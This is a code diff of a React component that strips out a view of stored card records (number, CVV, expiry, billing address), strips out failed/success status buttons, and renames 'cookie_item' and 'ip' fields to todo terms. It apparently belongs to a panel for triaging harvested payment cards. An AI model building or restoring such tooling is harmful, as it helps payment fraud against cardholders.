@@ -29,7 +29,6 @@ import Search from "./Search";
 import { useAppDispatch, useAppSelector } from "../../redux/hooks";
 import { toggleColumnHidden } from "../../redux/reducers/tableSlice";
 import { numberFormat } from "../../utils";
-import Tags from "./Tags";
 import { Simulate } from "react-dom/test-utils";
 import play = Simulate.play;
 import StatusDropdown from "./dropdown";
@@ -155,61 +154,60 @@ const Todo = () => {
     }))
   }
 
-  const showCardModal = (cardNumber: string, record: TodoState) => {
-    console.log(record)
-    const dataSource = Object.entries(record)
-      .filter(v => ["cardNumber", "cvv", "firstName", "lastName", "cardType", "expiredDate", "zipcode", "street", "city", "state", "country"].includes(v[0]))
-      .map((v, i) => ({ key: i, name: v[0], value: v[1] }))
-    const columns = [
-      {
-        dataIndex: 'name',
-        key: 'name',
-      },
-      {
-        dataIndex: 'value',
-        key: 'value',
-      },
-    ];
+  // const showCardModal = (cardNumber: string, record: TodoState) => {
+  //   const dataSource = Object.entries(record)
+  //     .filter(v => ["content", "state"].includes(v[0]))
+  //     .map((v, i) => ({ key: i, name: v[0], value: v[1] }))
+  //   const columns = [
+  //     {
+  //       dataIndex: 'name',
+  //       key: 'name',
+  //     },
+  //     {
+  //       dataIndex: 'value',
+  //       key: 'value',
+  //     },
+  //   ];
 
-    let content = record.content;
-    let results = record.content.match(/\d{4}/g);
-    if (results)
-      content = results.join(" ");
+  //   let content = record.content;
+  //   let results = record.content.match(/\d{4}/g);
+  //   if (results)
+  //     content = results.join(" ");
 
-    let detail =
-      <Row>
-        <Col>
-          {/* <div className="bank_card">
-            <img src="/card_bg.png" alt="" className="card_img" />
-            <div className="bank_card_top">
-              <img src="/card_01.png" alt="" className="bank_card_limg" />
-            </div>
-            <div className="bank_card_center">{cardNumbers}</div>
-            <div className="bank_card_footer">
-              <div className="bank_card_lfooter">
-                <div className="bank_card_tit">Card Holder</div>
-                <div className="bank_card_desc">{record.firstName} {record.lastName}</div>
-              </div>
+  //   let detail =
+  //     <Row>
+  //       <Col>
+  //         {/* <div className="bank_card">
+  //           <img src="/card_bg.png" alt="" className="card_img" />
+  //           <div className="bank_card_top">
+  //             <img src="/card_01.png" alt="" className="bank_card_limg" />
+  //           </div>
+  //           <div className="bank_card_center">{cardNumbers}</div>
+  //           <div className="bank_card_footer">
+  //             <div className="bank_card_lfooter">
+  //               <div className="bank_card_tit">Card Holder</div>
+  //               <div className="bank_card_desc">{record.firstName} {record.lastName}</div>
+  //             </div>
 
-              <div className="bank_card_rfooter">
-                <div className="bank_card_vcc">
-                  <div className="bank_card_tit">CVV</div>
-                  <div className="bank_card_desc">{record.cvv}</div></div><div>
-                  <div className="bank_card_tit">Expires</div>
-                  <div className="bank_card_desc">{record.expiredDate}</div>
-                </div>
-              </div>
-            </div>
-          </div> */}
-        </Col>
-        <Col>
-          <Table dataSource={dataSource} columns={columns} />;
-        </Col>
-      </Row>
+  //             <div className="bank_card_rfooter">
+  //               <div className="bank_card_vcc">
+  //                 <div className="bank_card_tit">CVV</div>
+  //                 <div className="bank_card_desc">{record.cvv}</div></div><div>
+  //                 <div className="bank_card_tit">Expires</div>
+  //                 <div className="bank_card_desc">{record.expiredDate}</div>
+  //               </div>
+  //             </div>
+  //           </div>
+  //         </div> */}
+  //       </Col>
+  //       <Col>
+  //         <Table dataSource={dataSource} columns={columns} />;
+  //       </Col>
+  //     </Row>
 
-    setTodo(detail);
-    setIsCardModalOpen(true);
-  };
+  //   setTodo(detail);
+  //   setIsCardModalOpen(true);
+  // };
 
   const handleCardModalOk = () => {
     setIsCardModalOpen(false);
@@ -238,17 +236,17 @@ const Todo = () => {
       key: "content",
       sorter: true,
       showSorterTooltip: false,
-      render: (value: string, record) => {
-        return (<>
-          <CopyToClipboard text={value} onCopy={() => {
-            message.success("Copied");
-            showCardModal(value, record);
-          }}>
-            <Button style={{ background: "#458f1b", color: "#fff" }}>{value}</Button>
-          </CopyToClipboard>
-          {/* <Button onClick={e => showCardModal(value, record)}>view card</Button> */}
-        </>)
-      }
+      // render: (value: string, record) => {
+      //   return (<>
+      //     <CopyToClipboard text={value} onCopy={() => {
+      //       message.success("Copied");
+      //       showCardModal(value, record);
+      //     }}>
+      //       <Button style={{ background: "#458f1b", color: "#fff" }}>{value}</Button>
+      //     </CopyToClipboard>
+      //     {/* <Button onClick={e => showCardModal(value, record)}>view card</Button> */}
+      //   </>)
+      // }
     }
     ,
     {
@@ -256,28 +254,28 @@ const Todo = () => {
       dataIndex: "state",
       key: "state",
       showSorterTooltip: false,
-      render: (value: string, record) => {
-        function changeCardNumberStatus(status: string) {
-          if (API.editItem) {
-            API.editItem(record._id ?? '', {
-              cardNumberStatus: status,
-            }).then(() => fetchData());
-          }
-        }
-        return (<>
-          <Button onClick={e => changeCardNumberStatus("failed")} style={{
-            color: "#fff",
-            background: '#fd177a',
-            padding: "0px 7px",
-          }}>F</Button>
-          <span className="pointStatus" style={{ background: value === 'success' ? '#458f1b' : (value === 'failed' ? '#fd177a' : '') }}> </span>
-          <Button onClick={e => changeCardNumberStatus("success")} style={{
-            color: "#fff",
-            background: '#458f1b',
-            padding: "0px 7px",
-          }}>S</Button>
-        </>);
-      }
+      // render: (value: string, record) => {
+      //   function changeCardNumberStatus(status: string) {
+      //     if (API.editItem) {
+      //       API.editItem(record._id ?? '', {
+      //         cardNumberStatus: status,
+      //       }).then(() => fetchData());
+      //     }
+      //   }
+      //   return (<>
+      //     <Button onClick={e => changeCardNumberStatus("failed")} style={{
+      //       color: "#fff",
+      //       background: '#fd177a',
+      //       padding: "0px 7px",
+      //     }}>F</Button>
+      //     <span className="pointStatus" style={{ background: value === 'success' ? '#458f1b' : (value === 'failed' ? '#fd177a' : '') }}> </span>
+      //     <Button onClick={e => changeCardNumberStatus("success")} style={{
+      //       color: "#fff",
+      //       background: '#458f1b',
+      //       padding: "0px 7px",
+      //     }}>S</Button>
+      //   </>);
+      // }
     },
 
     {
@@ -296,7 +294,7 @@ const Todo = () => {
     }];
 
   // visible columns
-  const tableKey = "cookie_item";
+  const tableKey = "todo";
   const hiddenColumns = useAppSelector((state) => state.table[tableKey]);
 
   const dispatch = useAppDispatch();
@@ -310,12 +308,13 @@ const Todo = () => {
 
   useEffect(() => {
     if (hiddenColumns.length == 0)
-      handleColumnVisibility("ip");
+      handleColumnVisibility("content");
   }, [])
 
-  const VISIBLE_COLUMNS = TABLE_COLUMNS.filter(
-    (column) => !hiddenColumns.includes(String(column.key))
-  );
+  const VISIBLE_COLUMNS = TABLE_COLUMNS
+  // .filter(
+  //   (column) => !hiddenColumns.includes(String(column.key))
+  // );
 
   const menu = (
     <Menu>
